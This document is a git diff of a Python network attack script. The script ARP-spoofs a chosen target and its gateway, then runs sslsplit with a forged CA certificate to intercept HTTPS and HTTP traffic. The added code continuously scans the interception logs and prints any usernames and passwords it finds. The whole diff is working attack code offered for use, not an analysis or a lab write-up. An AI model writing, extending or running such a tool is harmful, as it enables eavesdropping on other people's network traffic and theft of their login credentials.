@@ -5,8 +5,12 @@ import scapy.all as scapy
 import time
 import threading
 import os
-from netaddr import IPAddress
+# from netaddr import IPAddress
 import math
+from os import listdir
+from os.path import isfile, join
+import os
+import sys
 
 def get_mac(ip):
     for a in range(10):
@@ -41,21 +45,18 @@ def translate_to_slash(netmask):
     for i in range(4):
         number = number << 8
         number += int(temp[i])
-        # number = number << (8*i)
-        # print(number)
     slash = 0
     for i in range(32):
-        # print(number)
         if number % 2 == 1:
             slash = i
             break
         number = number >> 1
-    
     return 32 - slash
 
 
 def get_local_info():
-    interfaces = netifaces.ifaddresses('wlp3s0')
+    # interfaces = netifaces.ifaddresses('wlp3s0')
+    interfaces = netifaces.ifaddresses('enp0s3')
     # dictionary
     normal_internet = interfaces[netifaces.AF_INET][0]
     address = normal_internet['addr']
@@ -87,13 +88,81 @@ def getDevice(ip):
         print(element[1].psrc + "   " + element[1].hwsrc)
     print(' ')
 
-def sslSplit():
-    x = 0
-    while x < 5:
-        os.system("date")
-        x = x + 1
-        time.sleep(2)
-    print("[-] sslSplit stopped")
+def get_information(filename, record):
+    # parse log
+    line = ""
+    log = open(filename, 'rb')
+    byte = 1
+
+    # for i in range(100):
+    while byte:
+        line = ""
+        while 1:
+            byte = log.read(1)
+            if not byte:
+                log.close()
+                break
+            # byte = str(byte)[2]
+            line = line + str(byte)[2]
+            if byte == b'\n':
+                # print("next line")
+                break
+        line = line[:len(line)-2]
+        username = line.find('username=')
+        if username != -1:
+            try:
+                # print(line)
+                # find start with find username
+                # erase username&
+                line = line[username + 9:]
+                first_and_mark = line.find('&')
+                username = line[:first_and_mark]
+
+                # erase  &password=
+                line = line[first_and_mark+10:]
+                first_and_mark = line.find('&')
+                password = line[:first_and_mark]
+                try:
+                    record[username]
+                except KeyError:
+                    print()
+                    print("Username: ",username)
+                    print("Password ",password)
+                    record[username] = password
+            except:
+                pass
+    return record
+
+def sslSplit(stop):
+    # x = 0
+    # while x < 5:
+    #     os.system("date")
+    #     x = x + 1
+    #     time.sleep(2)
+    # print("[-] sslSplit stopped")
+    
+    # obtain file path
+    pathname = os.path.realpath(__file__)
+    last = pathname.rfind('/')
+    mypath = pathname[:last]
+    # run sslsplit
+    command =   'sslsplit -d -l ' + mypath + '/sslsplit/connections.log'\
+            ' -j ' + mypath + '/sslsplit/'\
+            ' -S ' + mypath + '/sslsplit/logdir/'\
+            ' -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080'
+    os.system(command)
+    # while loop keep search username and password
+    logpath = mypath + "/sslsplit/logdir/"
+    # used set() to record
+    # already_search = set()
+    record = {}
+    while stop() == 0:
+        onlyfiles = [f for f in listdir(logpath) if isfile(join(logpath, f))]
+        for i in onlyfiles:
+            record = get_information(logpath + i, record)
+        time.sleep(5)
+
+
 
 
 if __name__ == '__main__':
@@ -103,11 +172,14 @@ if __name__ == '__main__':
     # print(get_mac('192.168.99.100')) 
     getDevice(address + '/' + slash)
 
-    target_ip = "192.168.99.241" # Enter your target IP
+    target_ip = "192.168.99.215" # Enter your target IP
     # gateway_ip = "192.168.99.1" # Enter your gateway's IP
     gateway_ip = gw
-    # t = threading.Thread(target = sslSplit)
-    # t.start()
+
+
+    t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
+    t.start()
+    stop_threads = False
 
     try:
         sent_packets_count = 0
@@ -116,14 +188,16 @@ if __name__ == '__main__':
             spoof(gateway_ip, target_ip) # cheat on switch to know I am target
             sent_packets_count = sent_packets_count + 2
             print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-            time.sleep(2) # Waits for two seconds
+            time.sleep(1) # Waits for two seconds
     
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
         restore(gateway_ip, target_ip)
         restore(target_ip, gateway_ip)
         print("[-] Arp Spoof Stopped")
-    #     t.join()
+        stop_threads = True
+        t.join()
+        print("stop thread")
 
     # interface = netifaces.interfaces()[1]
     # print('=============')
